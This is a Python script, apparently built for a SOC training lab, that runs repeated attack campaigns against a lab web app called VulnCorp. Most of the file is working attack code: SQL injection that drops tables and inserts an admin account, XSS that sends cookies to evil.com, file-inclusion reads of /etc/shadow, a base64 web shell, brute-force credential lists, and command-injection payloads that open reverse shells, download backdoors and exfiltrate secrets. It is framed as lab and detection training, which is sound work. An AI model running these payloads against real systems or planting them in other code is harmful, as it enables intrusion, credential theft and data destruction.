#!/usr/bin/env python3
"""
============================================
SOC Lab — Multi-Module Attack Simulator
============================================
Simulates realistic adversary behavior against the VulnCorp web application.

Modules:
  1. SQL Injection (UNION, Error-based, Blind)
  2. Cross-Site Scripting (Reflected, Stored, Encoded)
  3. Local File Inclusion / Directory Traversal
  4. Remote File Inclusion
  5. Brute Force / Credential Stuffing
  6. Command Injection
  7. Scanner Simulation

MITRE ATT&CK Coverage:
  T1190 - Exploit Public-Facing Application
  T1110.003 - Brute Force: Password Spraying
  T1046 - Network Service Scanning
  T1048.003 - Exfiltration over HTTP
  T1059 - Command and Scripting Interpreter

⚠️  FOR EDUCATIONAL / LAB USE ONLY
"""

import os
import sys
import time
import random
import logging
import json
from datetime import datetime
from typing import Callable

import requests
from faker import Faker
from colorama import init, Fore, Style

# ============================================
# Configuration
# ============================================
init(autoreset=True)
fake = Faker()

TARGET_URL = os.getenv("TARGET_URL", "http://172.20.0.20")
ATTACK_DELAY_MIN = float(os.getenv("ATTACK_DELAY_MIN", "0.3"))
ATTACK_DELAY_MAX = float(os.getenv("ATTACK_DELAY_MAX", "2.0"))
TOTAL_ROUNDS = int(os.getenv("TOTAL_ROUNDS", "5"))
STARTUP_WAIT = int(os.getenv("STARTUP_WAIT", "30"))

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("/app/attack_simulator.log"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("AttackSimulator")

# ============================================
# Evasion: User-Agent Rotation
# ============================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    # Deliberately include scanner UAs to trigger detection rules
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
]


def get_session() -> requests.Session:
    """Create a session with a random User-Agent."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,*/*",
        "Accept-Language": "en-US,en;q=0.9",
    })
    session.verify = False
    return session


def random_delay():
    """Simulate realistic human-like delay between requests."""
    delay = random.uniform(ATTACK_DELAY_MIN, ATTACK_DELAY_MAX)
    time.sleep(delay)


# ============================================
# Module 1: SQL Injection
# ============================================
SQL_PAYLOADS = [
    # UNION-based
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT username,password,3,4,5 FROM users--",
    "' UNION SELECT null,null,null,null,sqlite_version()--",
    "' UNION ALL SELECT 1,group_concat(name),3,4,5 FROM sqlite_master--",
    # Error-based
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    # Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    # Time-based blind
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    # Stacked queries
    "'; DROP TABLE users;--",
    "'; INSERT INTO users(username,password,role) VALUES('hacker','pwned','admin');--",
    # Advanced
    "admin'--",
    "1' ORDER BY 10--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
]


def attack_sqli(session: requests.Session):
    """Execute SQL Injection attacks against login and search endpoints."""
    logger.info(f"{Fore.RED}[SQLi] Starting SQL Injection campaign")

    # Attack login endpoint (POST)
    for payload in random.sample(SQL_PAYLOADS, min(8, len(SQL_PAYLOADS))):
        try:
            resp = session.post(
                f"{TARGET_URL}/login.php",
                data={"username": payload, "password": "anything"},
                timeout=10,
            )
            status_color = Fore.GREEN if resp.status_code == 200 else Fore.YELLOW
            logger.info(
                f"{Fore.RED}[SQLi] POST /login.php | "
                f"Payload: {payload[:50]}... | "
                f"Status: {status_color}{resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.RED}[SQLi] Request failed: {e}")
        random_delay()

    # Attack search endpoint (GET)
    for payload in random.sample(SQL_PAYLOADS, min(6, len(SQL_PAYLOADS))):
        try:
            resp = session.get(
                f"{TARGET_URL}/search.php",
                params={"q": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.RED}[SQLi] GET /search.php?q={payload[:40]}... | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.RED}[SQLi] Request failed: {e}")
        random_delay()


# ============================================
# Module 2: Cross-Site Scripting (XSS)
# ============================================
XSS_PAYLOADS = [
    # Basic script tags
    '<script>alert("XSS")</script>',
    '<script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<script>new Image().src="http://evil.com/steal?cookie="+document.cookie;</script>',
    # Event handlers
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>hover me</div>',
    '<input onfocus=alert("XSS") autofocus>',
    # Encoded payloads
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src="javascript:alert(\'XSS\')">',
    '"><img src=x onerror=this.src="http://evil.com/?c="+document.cookie>',
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    # SVG-based
    '<svg><script>alert("XSS")</script></svg>',
    "<svg/onload=alert('XSS')>",
]


def attack_xss(session: requests.Session):
    """Execute XSS attacks against profile (reflected) and feedback (stored)."""
    logger.info(f"{Fore.MAGENTA}[XSS] Starting Cross-Site Scripting campaign")

    # Reflected XSS via profile page
    for payload in random.sample(XSS_PAYLOADS, min(6, len(XSS_PAYLOADS))):
        try:
            resp = session.get(
                f"{TARGET_URL}/profile.php",
                params={"user": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.MAGENTA}[XSS] GET /profile.php?user={payload[:40]}... | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.MAGENTA}[XSS] Request failed: {e}")
        random_delay()

    # Stored XSS via feedback form
    for payload in random.sample(XSS_PAYLOADS, min(4, len(XSS_PAYLOADS))):
        try:
            resp = session.post(
                f"{TARGET_URL}/feedback.php",
                data={"name": fake.name(), "message": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.MAGENTA}[XSS] POST /feedback.php | "
                f"Stored payload: {payload[:40]}... | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.MAGENTA}[XSS] Request failed: {e}")
        random_delay()


# ============================================
# Module 3: LFI / Directory Traversal
# ============================================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\etc\\passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=login.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]


def attack_lfi(session: requests.Session):
    """Execute LFI and directory traversal attacks."""
    logger.info(f"{Fore.CYAN}[LFI] Starting Local File Inclusion / Traversal campaign")

    for payload in random.sample(LFI_PAYLOADS, min(8, len(LFI_PAYLOADS))):
        try:
            resp = session.get(
                f"{TARGET_URL}/page.php",
                params={"file": payload},
                timeout=10,
            )
            # Check if passwd content leaked
            leaked = "root:" in resp.text if resp.status_code == 200 else False
            logger.info(
                f"{Fore.CYAN}[LFI] GET /page.php?file={payload[:50]}... | "
                f"Status: {resp.status_code} | "
                f"{'💀 DATA LEAKED!' if leaked else 'No leak detected'}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.CYAN}[LFI] Request failed: {e}")
        random_delay()


# ============================================
# Module 4: Remote File Inclusion (RFI)
# ============================================
RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "http://attacker.com/malware.php",
    "https://raw.githubusercontent.com/malicious/webshell/main/shell.php",
    "http://127.0.0.1:8888/reverse_shell.php",
    "ftp://evil.com/backdoor.php",
]


def attack_rfi(session: requests.Session):
    """Execute Remote File Inclusion attacks."""
    logger.info(f"{Fore.BLUE}[RFI] Starting Remote File Inclusion campaign")

    for payload in RFI_PAYLOADS:
        try:
            resp = session.get(
                f"{TARGET_URL}/page.php",
                params={"file": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.BLUE}[RFI] GET /page.php?file={payload} | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.BLUE}[RFI] Request failed: {e}")
        random_delay()


# ============================================
# Module 5: Brute Force / Credential Stuffing
# ============================================
COMMON_USERNAMES = ["admin", "root", "administrator", "user", "test", "guest", "operator", "manager"]
COMMON_PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome", "monkey",
    "master", "dragon", "login", "princess", "qwerty", "password1",
    "P@ssw0rd!", "Welcome123", "Admin@123", "root", "toor",
]


def attack_bruteforce(session: requests.Session):
    """Execute brute force / credential stuffing against login."""
    logger.info(f"{Fore.YELLOW}[BRUTE] Starting Brute Force campaign")

    attempts = 0
    for username in random.sample(COMMON_USERNAMES, min(5, len(COMMON_USERNAMES))):
        for password in random.sample(COMMON_PASSWORDS, min(6, len(COMMON_PASSWORDS))):
            try:
                resp = session.post(
                    f"{TARGET_URL}/login.php",
                    data={"username": username, "password": password},
                    timeout=10,
                )
                success = "Welcome back" in resp.text
                attempts += 1
                logger.info(
                    f"{Fore.YELLOW}[BRUTE] POST /login.php | "
                    f"{username}:{password} | "
                    f"Status: {resp.status_code} | "
                    f"{'🔓 SUCCESS!' if success else '❌ Failed'}"
                )
                if success:
                    logger.warning(
                        f"{Fore.RED}[BRUTE] 🚨 VALID CREDENTIALS FOUND: {username}:{password}"
                    )
            except requests.RequestException as e:
                logger.warning(f"{Fore.YELLOW}[BRUTE] Request failed: {e}")
            # Faster pace to trigger rate limiting
            time.sleep(random.uniform(0.1, 0.5))

    logger.info(f"{Fore.YELLOW}[BRUTE] Campaign complete. {attempts} attempts made.")


# ============================================
# Module 6: Command Injection
# ============================================
CMD_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(uname -a)",
    "; wget http://evil.com/backdoor.sh",
    "| nc -e /bin/sh evil.com 4444",
    "; curl http://evil.com/exfil?data=$(cat /etc/shadow)",
    "& ls -la /",
    "|| cat /etc/hosts",
    "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
]


def attack_cmdi(session: requests.Session):
    """Execute command injection attacks."""
    logger.info(f"{Fore.WHITE}[CMDi] Starting Command Injection campaign")

    for payload in random.sample(CMD_PAYLOADS, min(6, len(CMD_PAYLOADS))):
        try:
            # Try via search parameter
            resp = session.get(
                f"{TARGET_URL}/search.php",
                params={"q": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.WHITE}[CMDi] GET /search.php?q={payload[:40]}... | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.WHITE}[CMDi] Request failed: {e}")
        random_delay()

        try:
            # Try via feedback form
            resp = session.post(
                f"{TARGET_URL}/feedback.php",
                data={"name": "test", "message": payload},
                timeout=10,
            )
            logger.info(
                f"{Fore.WHITE}[CMDi] POST /feedback.php | "
                f"Payload: {payload[:40]}... | "
                f"Status: {resp.status_code}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.WHITE}[CMDi] Request failed: {e}")
        random_delay()


# ============================================
# Module 7: Scanner Simulation
# ============================================
SCANNER_PATHS = [
    "/admin", "/admin.php", "/administrator",
    "/wp-login.php", "/wp-admin",
    "/.env", "/config.php", "/phpinfo.php",
    "/robots.txt", "/sitemap.xml",
    "/.git/config", "/.svn/entries",
    "/backup", "/backup.sql", "/db.sql",
    "/server-status", "/server-info",
    "/phpmyadmin", "/adminer.php",
    "/api/v1/users", "/api/config",
    "/cgi-bin/", "/shell.php",
]


def attack_scanner(session: requests.Session):
    """Simulate a directory/vulnerability scanner."""
    logger.info(f"{Fore.GREEN}[SCAN] Starting Scanner Simulation")

    # Use a scanner-like User-Agent for some requests
    scanner_session = get_session()
    scanner_session.headers["User-Agent"] = "Nikto/2.1.6"

    for path in random.sample(SCANNER_PATHS, min(12, len(SCANNER_PATHS))):
        try:
            resp = scanner_session.get(f"{TARGET_URL}{path}", timeout=5)
            interesting = resp.status_code != 404
            logger.info(
                f"{Fore.GREEN}[SCAN] GET {path} | "
                f"Status: {resp.status_code} | "
                f"{'⚡ INTERESTING' if interesting else 'Not found'}"
            )
        except requests.RequestException as e:
            logger.warning(f"{Fore.GREEN}[SCAN] Request failed: {e}")
        time.sleep(random.uniform(0.05, 0.3))  # Fast scanning pattern


# ============================================
# Main Campaign Orchestrator
# ============================================
ATTACK_MODULES: list[tuple[str, Callable]] = [
    ("SQL Injection", attack_sqli),
    ("Cross-Site Scripting", attack_xss),
    ("Local File Inclusion", attack_lfi),
    ("Remote File Inclusion", attack_rfi),
    ("Brute Force", attack_bruteforce),
    ("Command Injection", attack_cmdi),
    ("Scanner Simulation", attack_scanner),
]


def wait_for_target():
    """Wait until the target web server is ready."""
    logger.info(f"Waiting {STARTUP_WAIT}s for target to initialize...")
    time.sleep(STARTUP_WAIT)

    for attempt in range(30):
        try:
            resp = requests.get(f"{TARGET_URL}/", timeout=5)
            if resp.status_code == 200:
                logger.info(f"{Fore.GREEN}Target is READY at {TARGET_URL}")
                return True
        except requests.RequestException:
            pass
        logger.info(f"Target not ready, retrying in 5s... (attempt {attempt + 1}/30)")
        time.sleep(5)

    logger.error("Target never became ready. Exiting.")
    return False


def run_campaign():
    """Execute a full attack campaign across all modules."""
    banner = f"""
{Fore.RED}{'='*60}
   _____ ____  ______   __          __
  / ___// __ \\/ ____/  / /   ____ _/ /_
  \\__ \\/ / / / /      / /   / __ `/ __ \\
 ___/ / /_/ / /___   / /___/ /_/ / /_/ /
/____/\\____/\\____/  /_____/\\__,_/_.___/

  ATTACK SIMULATOR — Integrated SOC Lab
  ⚠️  EDUCATIONAL USE ONLY
{'='*60}{Style.RESET_ALL}
"""
    print(banner)

    if not wait_for_target():
        return

    for round_num in range(1, TOTAL_ROUNDS + 1):
        logger.info(f"\n{'='*50}")
        logger.info(f"{Fore.RED}🔴 ATTACK ROUND {round_num}/{TOTAL_ROUNDS}")
        logger.info(f"{'='*50}")

        # Randomize module execution order per round
        shuffled_modules = random.sample(ATTACK_MODULES, len(ATTACK_MODULES))

        for module_name, module_func in shuffled_modules:
            logger.info(f"\n{Fore.CYAN}--- Module: {module_name} ---")
            session = get_session()
            try:
                module_func(session)
            except Exception as e:
                logger.error(f"Module {module_name} crashed: {e}")

            # Pause between modules
            pause = random.uniform(2.0, 5.0)
            logger.info(f"Pausing {pause:.1f}s before next module...")
            time.sleep(pause)

        # Pause between rounds
        if round_num < TOTAL_ROUNDS:
            round_pause = random.uniform(10.0, 20.0)
            logger.info(f"\n⏸️  Round {round_num} complete. Pausing {round_pause:.1f}s...\n")
            time.sleep(round_pause)

    logger.info(f"\n{Fore.GREEN}{'='*50}")
    logger.info(f"{Fore.GREEN}✅ ALL {TOTAL_ROUNDS} ATTACK ROUNDS COMPLETE")
    logger.info(f"{Fore.GREEN}{'='*50}")


if __name__ == "__main__":
    run_campaign()
